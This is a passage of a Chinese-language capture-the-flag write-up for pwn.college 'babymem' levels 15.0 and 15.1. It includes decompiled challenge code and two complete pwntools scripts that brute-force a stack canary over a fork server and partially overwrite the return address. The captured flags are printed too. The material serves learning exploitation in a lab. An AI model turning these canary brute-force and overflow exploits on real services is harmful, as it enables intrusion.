+  printf(
+    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
+    (char *)buf + nbytes,
+    nbytes - 106);
+  printf("Of these, you will overwrite %d bytes into the return address.\n", nbytes + (_DWORD)buf - rp_);
+  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
+  puts("Overwriting the entire return address is fine when we know");
+  puts("the whole address, but here, we only really know the last three nibbles.");
+  puts("These nibbles never change, because pages are aligned to 0x1000.");
+  puts("This gives us a workaround: we can overwrite the least significant byte");
+  puts("of the saved return address, which we can know from debugging the binary,");
+  puts("to retarget the return to main to any instruction that shares the other 7 bytes.");
+  puts("Since that last byte will be constant between executions (due to page alignment),");
+  puts("this will always work.");
+  puts("If the address we want to redirect execution to is a bit farther away from");
+  puts("the saved return address, and we need to write two bytes, then one of those");
+  puts("nibbles (the fourth least-significant one) will be a guess, and it will be");
+  puts("incorrect 15 of 16 times.");
+  puts("This is okay: we can just run our exploit a few times until it works");
+  puts("(statistically, ~50% chance after 11 times and ~90% chance after 36 times).");
+  puts("One caveat in this challenge is that the win_authed() function must first auth:");
+  puts("it only lets you win if you provide it with the argument 0x1337.");
+  puts("Speifically, the win_authed() function looks something like:");
+  puts("    void win_authed(int token)");
+  puts("    {");
+  puts("      if (token != 0x1337) return;");
+  puts("      puts(\"You win! Here is your flag: \");");
+  puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
+  puts("      puts(\"\");");
+  puts("    }");
+  puts(byte_43BB);
+  puts("So how do you pass the check? There *is* a way, and we will cover it later,");
+  puts("but for now, we will simply bypass it! You can overwrite the return address");
+  puts("with *any* value (as long as it points to executable code), not just the start");
+  puts("of functions. Let's overwrite past the token check in win!\n");
+  puts("To do this, we will need to analyze the program with objdump, identify where");
+  puts("the check is in the win_authed() function, find the address right after the check,");
+  puts("and write that address over the saved return address.\n");
+  puts("Go ahead and find this address now. When you're ready, input a buffer overflow");
+  printf(
+    "that will overwrite the saved return address (at %p, %d bytes into the buffer)\n",
+    (const void *)rp_,
+    rp_ - (_DWORD)buf);
+  puts("with the correct value.\n");
+  printf("Send your payload (up to %lu bytes)!\n", nbytes);
+  v8 = read(0, buf, nbytes);
+  if ( v8 < 0 )
+  {
+    v3 = __errno_location();
+    v4 = strerror(*v3);
+    printf("ERROR: Failed to read input -- %s!\n", v4);
+    exit(1);
+  }
+  printf("You sent %d bytes!\n", v8);
+  puts("Let's see what happened with the stack:\n");
+  DUMP_STACK(sp_, sz_);
+  puts("The program's memory status:");
+  printf("- the input buffer starts at %p\n", buf);
+  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
+  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
+  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
+  printf("- the canary is stored at %p.\n", (const void *)cp_);
+  printf("- the canary value is now %p.\n", *(const void **)cp_);
+  printf("- the address of win_authed() is %p.\n", win_authed);
+  putchar(10);
+  puts("If you have managed to overwrite the return address with the correct value,");
+  puts("challenge() will jump straight to win_authed() when it returns.");
+  printf("Let's try it now!\n\n");
+  if ( (unsigned __int64)buf + v8 > rp_ + 2 )
+  {
+    puts("WARNING: You sent in too much data, and overwrote more than two bytes of the address.");
+    puts("         This can still work, because I told you the correct address to use for");
+    puts("         this execution, but you should not rely on that information.");
+    puts("         You can solve this challenge by only overwriting two bytes!");
+    puts("         ");
+  }
+  puts("Goodbye!");
+  return 0LL;
+}
+```
+
+这个 `challenge` 也没啥好说的，存在一个栈溢出。
+
+因为我们的子进程都是由主进程生成的，所以每个子进程都会持有和主进程相同的 canary 值。利用这点加上栈溢出漏洞，我们可以爆破 canary。这是个 64-bits 程序，我们实际只要爆破 56-bits，所以爆破时间不会很长。
+
+把 canary 爆出来后，就可以去快乐的覆盖返回地址了。因为有 PIE 保护，所以我们还得猜倒数第四个 nibble，不过我相信这对你来说也是一件很轻松的事情～
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+import os
+import subprocess
+import time
+
+import psutil
+from pwn import ELF, context, gdb, log, pause, process, random, remote, sleep
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-15-0"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+set follow-fork-mode child
+b *challenge+1807
+c
+"""
+
+
+def to_hex_bytes(data):
+    return "".join(f"\\x{byte:02x}" for byte in data)
+
+
+def get_forked_pid(parent_pid):
+    parent = psutil.Process(parent_pid)
+    children = parent.children()
+
+    log.success(f"Parent process: {parent_pid} -> Found children: {children}")
+    if len(children) != 1:
+        raise Exception(f"Expected 1 child process, found {len(children)}")
+    return children[0].pid
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)
+
+        if debug:
+            if attach:
+                with open(os.devnull, "w") as fnull:
+                    subprocess.Popen(
+                        [context.terminal[0], "-e", "nc", "localhost", "1337"],
+                        stderr=fnull,
+                    )
+                    sleep(3)
+
+                child_pid = get_forked_pid(target.pid)
+                gdb.attach(target=child_pid, gdbscript=gdbscript)
+
+                return remote(HOST, PORT)
+            else:
+                target.close()
+
+                return gdb.debug(
+                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+                )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+padding_to_canary = b"".ljust(0x78, b"A")
+padding_to_ret = b"".ljust(0x8, b"A")
+fixed_offset = b"\x6b"
+possible_bytes = [bytes([i]) for i in range(0xD, 0x10D, 0x10)]
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+
+        target.sendlineafter(b"Payload size: ", payload_size)
+        target.sendafter(b"Send your payload", payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def brute_force_canary():
+    canary = b"\x00"
+    start_time = time.time()
+
+    log.progress("Brute-forcing the canary...")
+
+    while len(canary) < 0x8:
+        for byte in range(0x0, 0xFF):
+            with remote(HOST, PORT) as target:
+                send_payload(target, padding_to_canary + canary + bytes([byte]))
+
+                response = target.recvall(timeout=5)
+
+                if b"*** stack smashing detected ***" not in response:
+                    canary += bytes([byte])
+                    break
+
+    end_time = time.time()
+    elapsed_time = end_time - start_time
+
+    log.success(
+        f"Canary brute-forced: {to_hex_bytes(canary)} in {elapsed_time:.2f} seconds"
+    )
+    sleep(1)
+
+    return canary
+
+
+def construct_payload(canary):
+    payload = padding_to_canary
+    payload += canary
+    payload += padding_to_ret
+    payload += fixed_offset + random.choice(possible_bytes)
+
+    return payload
+
+
+def attack(payload):
+    try:
+        with remote(HOST, PORT) as target:
+            send_payload(target, payload)
+
+            response = target.recvall(timeout=5)
+
+            return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    launch()
+    canary = brute_force_canary()
+
+    while True:
+        try:
+            payload = construct_payload(canary)
+
+            if attack(payload):
+                log.success("Success! Exiting...")
+
+                pause()
+                exit()
+        except Exception as e:
+            log.exception(f"An error occurred in main loop: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{MiU_dCA8jccj_TYZgFn1iejPdTj.01NxMDL5cTNxgzW}`
+
+## Level 15.1
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Defeat a stack canary in a PIE binary by utilizing a network-style fork server in the target binary.
+
+### Write-up
+
+不用讲吧，思路见上题。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+import os
+import subprocess
+import time
+
+import psutil
+from pwn import ELF, context, gdb, log, pause, process, random, remote, sleep
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-15-1"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+set follow-fork-mode child
+b *challenge+213
+c
+"""
+
+
+def to_hex_bytes(data):
+    return "".join(f"\\x{byte:02x}" for byte in data)
+
+
+def get_forked_pid(parent_pid):
+    parent = psutil.Process(parent_pid)
+    children = parent.children()
+
+    log.success(f"Parent process: {parent_pid} -> Found children: {children}")
+    if len(children) != 1:
+        raise Exception(f"Expected 1 child process, found {len(children)}")
+    return children[0].pid
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)
+
+        if debug:
+            if attach:
+                with open(os.devnull, "w") as fnull:
+                    subprocess.Popen(
+                        [context.terminal[0], "-e", "nc", "localhost", "1337"],
+                        stderr=fnull,
+                    )
+                    sleep(3)
+
+                child_pid = get_forked_pid(target.pid)
+                gdb.attach(target=child_pid, gdbscript=gdbscript)
+
+                return remote(HOST, PORT)
+            else:
+                target.close()
+
+                return gdb.debug(
+                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+                )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+padding_to_canary = b"".ljust(0x48, b"A")
+padding_to_ret = b"".ljust(0x8, b"A")
+fixed_offset = b"\xcd"
+possible_bytes = [bytes([i]) for i in range(0x5, 0x105, 0x10)]
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+
+        target.sendlineafter(b"Payload size: ", payload_size)
+        target.sendafter(b"Send your payload", payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def brute_force_canary():
+    canary = b"\x00"
+    start_time = time.time()
+
+    while len(canary) < 0x8:
+        for byte in range(0x0, 0xFF):
+            with remote(HOST, PORT) as target:
+                log.progress("Brute-forcing the canary...")
+                send_payload(target, padding_to_canary + canary + bytes([byte]))
+
+                response = target.recvall(timeout=5)
+
+                if b"*** stack smashing detected ***" not in response:
+                    canary += bytes([byte])
+                    break
+
+    end_time = time.time()
+    elapsed_time = end_time - start_time
+
+    log.success(
+        f"Canary brute-forced: {to_hex_bytes(canary)} in {elapsed_time:.2f} seconds"
+    )
+    sleep(1)
+
+    return canary
+
+
+def construct_payload(canary):
+    payload = padding_to_canary
+    payload += canary
+    payload += padding_to_ret
+    payload += fixed_offset + random.choice(possible_bytes)
+
+    return payload
+
+
+def attack(payload):
+    try:
+        with remote(HOST, PORT) as target:
+            send_payload(target, payload)
+
+            response = target.recvall(timeout=5)
+
+            return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    launch()
+    canary = brute_force_canary()
+
+    while True:
+        try:
+            payload = construct_payload(canary)
+
+            if attack(payload):
+                log.success("Success! Exiting...")
+
+                pause()
+                exit()
+        except Exception as e:
+            log.exception(f"An error occurred in main loop: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{8C2ZHb8LE-O7bRe0DvQeo4_5XUV.0FOxMDL5cTNxgzW}`
+
+## 后记
+
+`pwn.college` 的题目质量没得说，我感觉很棒。打完这 30 题一共花了我 18 天，感觉挺慢的，但算了一下天数好像也没花太久吧哈哈哈。那么，下一站，**Shellcode Injection**！
+
+马上就放寒假了，不知道我能在下次开学前达到什么水平呢 _>w<_
+
+让我们拭目以待。
+
+~_唉，寒假还得准备英语等级考试，爷的时间啊！:sob:_~
